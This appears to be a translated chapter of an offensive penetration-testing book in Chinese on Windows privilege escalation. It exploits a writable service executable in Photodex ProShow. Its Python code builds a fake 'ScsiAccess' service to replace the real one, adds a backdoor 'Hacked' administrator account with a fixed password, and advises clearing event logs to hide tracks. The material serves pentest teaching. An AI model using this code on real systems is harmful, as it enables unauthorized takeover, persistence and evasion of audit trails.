# 第五章：Windows 中的其他有趣内容

在本章中，我们将主要关注在 Windows 系统中利用易受攻击的软件，并使用不同的技术进行特权提升。随后，我们还将创建后门并掩盖痕迹。本章将大致介绍如何利用 Python 脚本的强大功能来为我们所用。

本章将涵盖以下主题：

+   特权提升 – 弱服务文件

+   特权提升 – 准备易受攻击的软件

+   特权提升 – 后门合法的 Windows 服务

+   特权提升 – 创建新的管理员账户并掩盖痕迹

# 特权提升 – 弱服务文件

在渗透测试阶段，你可能会遇到一个标准用户账号，在此账号下，由于**用户访问控制**（**UAC**），你没有完全的权限访问或修改文件系统，每次你试图提升权限时，都会弹出一个窗口，要求你输入管理员密码。在本节中，我们将讨论一种**特权提升攻击**的类型，你可以通过这种方式从标准用户权限提升到管理员或系统权限。这些我们将讨论的攻击方法，称为**通过服务文件权限漏洞进行特权提升**。如果服务可执行文件的位置可以被标准用户修改，则系统将变得易受攻击。此时，它可以被另一个恶意可执行文件覆盖。我们可以利用这一点，通过启动我们的恶意可执行文件来获取系统权限。一旦在重启系统后启动服务，被替换的可执行文件将运行，而不是原始的服务可执行文件。总之，我们已经获得了系统权限，并将运行一个属于易受攻击软件的 EXE 文件。现在，由于该软件的 EXE 文件可以被标准用户在标准用户的配置文件中写入，因此我们可以简单地将其替换为恶意 EXE 文件。

因此，这款软件 EXE 文件可以由用户空间的标准用户写入或修改。所以，我们可以做的事情是，直接将软件 EXE 文件替换为恶意 EXE 文件。在接下来的三次启动中，我们的 EXE 将取而代之，并将以系统权限执行。

这是一个关于特权提升类型的链接，并简要描述每种类型：

[`attack.mitre.org/wiki/Privilege_Escalation`](https://attack.mitre.org/wiki/Privilege_Escalation)。如果你有时间，我建议你阅读这篇文章。

# 特权提升 – 准备易受攻击的软件

在本次演示中，我将使用一款名为**Photodex**的易受攻击软件，该软件来源于 Exploit Database 网站。你可以从[`www.exploit-db.com/exploits/24872/`](https://www.exploit-db.com/exploits/24872/)下载此软件。下载完成后，将该软件安装到目标机器上。安装完成后，重启机器。

现在，让我们尝试在目标 Windows 机器上创建一个 `nonadmin` 标准账户，方法是前往控制面板 | 添加或删除用户账户 | 创建一个新账户。我们将其命名为 `nonadmin`。创建完账户后，登录到 `nonadmin` 账户，导航到安装时创建的 `Photodex` 目录，路径在 `C:\` 驱动器，同时打开任务管理器。

你将能够在“服务”标签下看到由 Photodex 软件创建的服务名称，即 `ScsiAccess`。要获取更多关于此服务的信息，请点击“服务”按钮。在打开的“服务”窗口中，找到 `ScsiAccess`，右键点击并选择“属性”，你将能够找到该服务的 EXE 文件路径。然后进入该目录，在我的例子中，它是 `C:\Program Files\Photodex\Pro Show Producer\ScsiAccess.exe`。找到 EXE 文件，右键点击它；注意，我们不需要任何管理员权限就能重命名、删除、复制甚至剪切这个文件。所以，理论上，如果我把这个文件重命名为 `ABC`，例如，然后用一个恶意文件替代它，那么我们就可以利用这个漏洞。接下来，我们将看看如何利用这个漏洞。在下一部分，我们将纯粹使用 Python 创建一个新的服务 EXE 文件。然后，我们将替换当前的 `sciaccess.exe` 文件，并看看通过这样做我们能获取哪些权限。

# 权限提升 – 通过后门访问合法的 Windows 服务

在这一部分中，我们将编写一个恶意服务文件来替换合法的服务文件。现在，为了替换服务文件，我们的新恶意服务文件应该能够与 Windows 服务控制管理器进行通信。例如，当你手动启动、停止、暂停或恢复服务时，Windows 服务控制管理器会向 EXE 服务文件发送信号或命令，作为回应，服务文件通常会服从服务控制管理器的命令。如果由于某种原因，服务文件或 EXE 文件未能理解该信号，那么服务控制管理器将无法启动服务，并且你会收到一个错误提示：“服务没有及时响应启动或控制请求”。

现在，让我们进入代码部分：

```
# Python For Offensive PenTest

# Backdooring Legitimate Windows Service

import servicemanager
import win32serviceutil
import win32service
import win32api

import os
import ctypes

...

# Part 1 - initializing : in this section we:-
if __name__ == '__main__':

    servicemanager.Initialize() # define a listener for win servicemanager
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service) #pass a Service class handler, so whenver we got a signal from the servicemanager we will pass it to the Service class

```

首先，我的部分代码继承自我在 ActiveState 网站上找到的一个脚本。在这里，你可以找到原始脚本：[`code.activestate.com/recipes/551780/`](http://code.activestate.com/recipes/551780/)。其次，我建议阅读更多关于 Microsoft 服务控制管理器功能的资料。这里是一个不错的起点：[`msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx)。最后但同样重要的是，`pywin`库是创建 Windows 服务的前置库。你可以从以下链接下载：[`sourceforge.net/projects/pywin32/files/pywin32/Build%20219/`](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/)。我们的代码可以分为两个部分。第一部分是关于初始化的。在这一部分，我们为 Windows 定义一个监听器，即`servicemanager`。然后，我们传递一个`Service`类处理程序，因此每当我们从`servicemanager`接收到信号时，我们会将其传递给`Service`类。

让我们进入第二部分：

```
# Part 2 - Here (in service class) we define the action to do when we got a service manager signal 

class Service(win32serviceutil.ServiceFramework):

    _svc_name_ = 'ScsiAccess' # specify the service name and the display name - note that the name scsiacces is similar to the original one for photodex vulnerable software
    _svc_display_name_ = 'ScsiAccess'

    def __init__(self, *args): # Initialize ServiceFramework and we define in functions style what to do when we got a service manager signal
        win32serviceutil.ServiceFramework.__init__(self, *args)

    def sleep(self, sec): # if the service manager signal was pause - then we sleep for an amount of seconds
        win32api.Sleep(sec*1000, True)

    def SvcDoRun(self): # if the signal was start - then:-

        self.ReportServiceStatus(win32service.SERVICE_START_PENDING) # tell the Service Manager that we are planning to run the service via reporting back a start pending status
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING) #tell the Service Manager that we are currently running up the service then call the start
                                                                   #function (start) if any exception happened, we will call the stop function (SvcStop)
            self.start() 

        except Exception, x:
            self.SvcStop()

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) #tell the Service Manager that we are planning to stop the serivce
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED) #tell the Service Manager that we are currently stopping the service

    def start(self):
        self.runflag=True # mark a service status flag as True and we will Wait in while loop for receiving service stop signal from the service manager

        '''
        This little code is to double check if we got an admin priv, after replacing our malicious service, thanks to IsUserAnAdmin function
        https://msdn.microsoft.com/en-us/library/windows/desktop/bb776463(v=vs.85).aspx

        f = open('C:/Users/nonadmin/Desktop/priv.txt','w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            f.write('[-] We are NOT admin! ')
        else:
            f.write('[+] We are admin :)')
        f.close()
        '''

        while self.runflag: # Wait for service stop signal
            self.sleep(10)

    def stop(self): # now within the stop function we mark the service status flag as False to break the while loop in the start function
         self.runflag=False
```

在第二部分，我们定义了在接收到服务管理器信号时应该执行的操作，这将在`Service`类中发生。在前两行中，我们指定了服务名称和显示名称。请注意，我选择的名称`ScsiAccess`与 Photodex 软件的原始名称相似。因此，如果我们像上一部分那样从 Windows 任务管理器打开服务，名称将与脆弱软件的服务名称完全匹配。

接下来，我们初始化`ServiceFramework`，并以函数式的方式定义在接收到服务管理器信号时应该执行的操作。例如，如果服务管理器的信号是暂停，那么我们将`sleep`指定的秒数，即`Sleep(sec*1000, True)`。同样，如果信号是启动，那么我们会告诉服务管理器我们计划运行该服务；这将通过通过`ReportServiceStatus()`报告`SERVICE_START_PENDING`状态来完成。然后，在异常处理程序中，我们将告诉服务管理器我们正在启动服务，并且会调用`start()`函数。如果发生任何异常，我们将在这里调用`SvcStop()`函数。

一旦我们执行了`start()`函数，我们将`ServiceStatus`标志设置为`True`，然后我们将在一个`while`循环中等待接收来自服务管理器的停止信号。如果我们收到此信号，我们将转到`stop()`函数，最终将标志切换为`False`。现在，在`stop()`函数内部，我们将执行与`start()`函数类似的过程。因此，我们会告诉服务管理器我们计划停止服务，然后执行`stop()`函数，最后告诉服务管理器我们当前正在停止服务。现在，在`stop()`函数中，我们将服务状态标志设置为`False`，以打破`start()`函数中的无限循环。现在，如果我将此脚本导出为 EXE 文件，并用它替代`sciaccess.exe`并重启机器，应该可以正常工作。然而，我想再进一步，证明我们获得了系统权限。那么，让我们确保利用过程正常工作。为此，我编写了一个快速的 Python 脚本来检查我们是否以管理员身份运行：

```
# Are we Admin

import ctypes

if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    print '[-] We are NOT admin! '
else:
    print '[+] We are admin :) '
```

这个脚本将简单地调用 Windows 中的`IsUserAnAdmin()`函数。如果返回值是`0`，则表示我们是标准用户；否则，表示我们拥有管理员权限。要运行这个脚本，请以管理员身份打开命令提示符，并导航到`Desktop`然后是`Users`，然后输入`python "Are we Admin.py"`。如果我们拥有管理员权限，将显示`[+] We are admin :)`。这是因为在启动命令提示符之前，我右键点击并选择了“以管理员身份运行”。

所以，我打算在我们的代码中使用这个小技巧，并将检查管理员权限的脚本注入到我们的恶意服务中。显然，它应该在服务启动时执行，因此应该位于`start()`函数内。一旦我们运行服务，我们将在桌面上创建一个文本文件，文件中将显示我们当前的权限。

所以，我们现在将像上一章一样将脚本导出为 EXE 文件，到这时，我们需要做的就是用生成的文件替换原始的 EXE 文件。前往 Photodex 软件的原始文件位置。由于软件存在漏洞，我们可以替换这个文件。所以，我将把这个文件重命名为`access2`，然后简单地复制并粘贴我们的恶意文件。如果一切正常，我们的服务应该没有任何错误地运行，并且我们应该在桌面上看到一个文本文件，打开它后应该告诉我们当前运行的权限。重启后，你会注意到桌面上有一个`priv`文本文件。如果你打开它，你会看到一行文本，说明我们以管理员身份运行。

# 提权攻击——创建一个新的管理员账户并掩盖痕迹

在我们之前的章节中，我们创建了一个恶意的 Python 服务，并将合法服务替换掉。一旦系统启动，我们验证了我们获得了系统或管理员权限。现在，在这一节中，我们将看到如何创建一个新的管理员账户，然后从标准用户跳转到管理员账户。所以，我在代码部分做的修改是将以下部分添加到之前的代码中，简而言之，这段代码将会在服务启动后创建一个新的管理员账户：

```
...       

 USER = "Hacked"
        GROUP = "Administrators"
        user_info = dict ( # create a user info profile in a dictionary format
               name = USER,
               password = "python_is_my_life", # Define the password for the 'hacked' username
               priv = win32netcon.USER_PRIV_USER,
               home_dir = None,
               comment = None,
               flags = win32netcon.UF_SCRIPT,
               script_path = None
                )

        user_group_info = dict ( # create a group info profile in a dictionary format
            domainandname = USER
           )

        try:
            win32net.NetUserAdd (None, 1, user_info)
            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])
        except Exception, x:
            pass

...
```

所以，记住，我已经在`start()`函数下添加了上述部分。在这里，我们定义了一个名为`Hacked`的新用户名，以及它所属的组，即`Administrators`组。接下来，我们在字典格式中创建一个用户和组信息配置文件。然后，在字典中，我们指定一些值，如`password`、`priv`和`home_dir`。最后，我们创建新的管理员账户并将其添加为`Administrators`组的成员。如果在创建过程中发生任何异常，我们将简单跳过它。现在，在导出代码为 EXE 并测试之前，快速验证一下我们在机器上获得的用户名，通过在命令提示符中运行`net users`，它会列出机器上的所有用户。

目前，我们登录的是`nonadmin`账户。所以，让我们继续在这里导出 EXE。将脚本复制到`Toexe`文件夹并重命名为`sciaccess`。现在，运行安装文件。然后，将导出的 EXE 文件复制并替换掉`Photodex\ProShow Producer`文件夹中的脆弱软件。此时，如果一切正常，重启后我们应该能看到一个名为`Hacked`的新管理员账户。现在，重启机器并登录到`nonadmin`账户。打开命令提示符。现在，如果我们输入`net users`，我们将看到一个新的用户名`Hacked`。

如果我们输入`net users Hacked`，我们会看到底部显示我们属于`Administrators`组。所以，在这一点上，一旦我们获得管理员权限，就可以为所欲为。那么，让我们走上歧途，使用被黑的管理员账户登录并清除事件查看器中的 Windows 事件日志。这将有助于我们掩盖痕迹。

# 总结

在本章中，我们学习了不同的特权提升方式和漏洞利用方法。我们从导出文件到 EXE 开始，然后转向针对脆弱软件。之后，我们开始创建后门并随后掩盖我们的痕迹，以避免被发现。

在下一章，我们将处理不同类型的加密算法。
